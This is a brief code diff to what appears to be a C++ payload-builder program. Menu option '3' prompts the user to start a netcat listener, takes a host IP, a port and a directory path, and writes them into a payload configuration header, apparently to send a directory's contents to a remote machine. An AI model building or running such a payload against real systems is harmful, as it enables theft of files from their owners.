@@ -55,6 +55,12 @@ int main(){
                 system(sys_call.c_str());
                 break;
             case '3':
+                cout << "This requires a listener. Start one with:\n"
+                        "    nc -lvp [port]\n";
+                cout << "Host IP:\n";
+                getline(cin, ip);
+                cout << "Host Port:\n";
+                getline(cin, port);
                 cout << "Directory's absolute path:\n";
                 getline(cin, path);
                 config_file.open("payload3_config.h");
